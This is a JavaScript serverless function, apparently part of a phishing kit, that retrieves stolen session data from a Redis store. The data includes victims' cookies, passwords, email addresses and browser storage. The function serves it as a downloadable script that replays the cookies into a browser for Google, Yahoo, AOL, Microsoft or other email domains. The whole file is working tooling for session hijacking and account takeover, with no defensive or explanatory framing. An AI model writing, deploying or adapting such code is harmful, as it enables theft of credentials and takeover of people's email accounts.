export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Check environment variables
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
      console.error('Missing Redis configuration in getCookies');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Redis credentials missing' 
        }),
      };
    }

    // Initialize Redis
    let redis;
    try {
      const { Redis } = await import('@upstash/redis');
      redis = new Redis({
        url: UPSTASH_REDIS_REST_URL,
        token: UPSTASH_REDIS_REST_TOKEN,
      });
    } catch (redisError) {
      console.error('Redis initialization error:', redisError);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Database connection error',
          details: redisError.message
        }),
      };
    }

    // Get client IP
    const getClientIP = () => {
      return event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
             event.headers['x-real-ip'] || 
             event.headers['cf-connecting-ip'] ||
             event.requestContext?.identity?.sourceIp ||
             'Unknown';
    };

    // Get parameters
    const url = new URL(event.rawUrl || event.path || event.rawPath || '/', 'https://example.com');
    const sessionId = url.searchParams.get('sessionId');
    const email = url.searchParams.get('email');

    console.log('🔍 Getting cookies for:', { sessionId, email });

    if (!sessionId && !email) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'SessionId or email parameter required' }),
      };
    }

    let cookiesData = null;

    // Try to get by session ID first
    if (sessionId) {
      try {
        const sessionData = await redis.get(`session:${sessionId}`);
        if (sessionData) {
          const session = JSON.parse(sessionData);
          cookiesData = {
            cookies: session.formattedCookies || session.cookies || [],
            localStorage: session.localStorage || 'Empty',
            sessionStorage: session.sessionStorage || 'Empty',
            timestamp: session.timestamp,
            email: session.email,
            password: session.password || 'Not captured',
            provider: session.provider || 'Others'
          };
        }
      } catch (error) {
        console.error('Error getting session by ID:', error);
      }
    }

    // Fallback to email lookup
    if (!cookiesData && email) {
      try {
        const userData = await redis.get(`user:${email}`);
        if (userData) {
          const user = JSON.parse(userData);
          cookiesData = {
            cookies: user.formattedCookies || user.cookies || [],
            localStorage: user.localStorage || 'Empty',
            sessionStorage: user.sessionStorage || 'Empty',
            timestamp: user.timestamp,
            email: user.email,
            password: user.password || 'Not captured',
            provider: user.provider || 'Others'
          };
        }
      } catch (error) {
        console.error('Error getting user by email:', error);
      }
    }

    // Try cookies-specific lookup
    if (!cookiesData && sessionId) {
      try {
        const cookieSpecificData = await redis.get(`cookies:${sessionId}`);
        if (cookieSpecificData) {
          cookiesData = JSON.parse(cookieSpecificData);
        }
      } catch (error) {
        console.error('Error getting cookies by session ID:', error);
      }
    }

    if (!cookiesData) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ 
          error: 'No cookies found for the specified session',
          sessionId: sessionId,
          email: email
        }),
      };
    }

    console.log('✅ Found cookies data:', {
      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
      email: cookiesData.email,
      provider: cookiesData.provider
    });

    const clientIP = getClientIP();
    const userEmail = cookiesData.email || 'Not captured';
    const userPassword = cookiesData.password || 'Not captured';
    const userProvider = cookiesData.provider || 'Others';

    // Helper to get domain from email/provider
    const getDomainFromEmailProvider = (email, provider) => {
      const providerLower = (provider || '').toLowerCase();
      if (providerLower.includes('gmail') || providerLower.includes('google')) {
        return '.google.com';
      } else if (providerLower.includes('yahoo')) {
        return '.yahoo.com';
      } else if (providerLower.includes('aol')) {
        return '.aol.com';
      } else if (providerLower.includes('hotmail') || providerLower.includes('live') || 
                 providerLower.includes('outlook') || providerLower.includes('office365')) {
        return '.live.com';
      } else if (providerLower === 'others' && email && email.includes('@')) {
        const domainPart = email.split('@')[1].toLowerCase();
        return '.' + domainPart;
      }
      // Fallback based on email
      if (email && email.includes('@')) {
        return '.' + email.split('@')[1].toLowerCase();
      }
      return '.google.com';
    };

    // Process cookies with improved handling
    let processedCookies = [];
    
    if (Array.isArray(cookiesData.cookies)) {
      processedCookies = cookiesData.cookies.filter(cookie => cookie && cookie.name);
    } else if (typeof cookiesData.cookies === 'string' && cookiesData.cookies !== 'No cookies found') {
      try {
        const parsedCookies = JSON.parse(cookiesData.cookies);
        if (Array.isArray(parsedCookies)) {
          processedCookies = parsedCookies.filter(cookie => cookie && cookie.name);
        }
      } catch (e) {
        // Try to parse as document.cookie format
        if (cookiesData.cookies.includes('=')) {
          const cookieStrings = cookiesData.cookies.split(';');
          processedCookies = cookieStrings.map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              // Set domain using improved logic:
              domain: getDomainFromEmailProvider(userEmail, userProvider),
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          }).filter(cookie => cookie !== null);
        }
      }
    }

    // Ensure cookies have proper format
    const formattedCookies = processedCookies.map(cookie => ({
      domain: cookie.domain || getDomainFromEmailProvider(userEmail, userProvider),
      expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
      hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : false,
      httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
      name: cookie.name || '',
      path: cookie.path || '/',
      sameSite: cookie.sameSite || 'none',
      secure: cookie.secure !== undefined ? cookie.secure : true,
      session: cookie.session !== undefined ? cookie.session : false,
      storeId: cookie.storeId || null,
      value: cookie.value || ''
    }));

    // Create JavaScript injection code
    const jsInjectionCode = formattedCookies.length > 0 ? 
      `!function(){console.log("%c COOKIES LOADED","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(formattedCookies))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;console.log("Cookie set:",o.name);location.reload()}();` :
      `console.log("%c NO COOKIES AVAILABLE","background:red;color:#fff;font-size:30px;");alert("No cookies found for this session.");`;

    // Create the output
    const output = `// Cookie restoration for ${userEmail}
// Generated: ${new Date().toISOString()}
// Cookies found: ${formattedCookies.length}

let ipaddress = "${clientIP}";
let email = "${userEmail}";
let password = "${userPassword}";

${jsInjectionCode}

// Cookie Data:
${JSON.stringify(formattedCookies, null, 2)}

// Local Storage:
// ${cookiesData.localStorage || 'Empty'}

// Session Storage:
// ${cookiesData.sessionStorage || 'Empty'}`;

    return {
      statusCode: 200,
      headers: {
        ...headers,
        'Content-Type': 'text/javascript',
        'Content-Disposition': `attachment; filename="cookies_${userEmail.replace('@', '_at_')}_${Date.now()}.js"`,
      },
      body: output,
    };

  } catch (error) {
    console.error('❌ Error in getCookies function:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};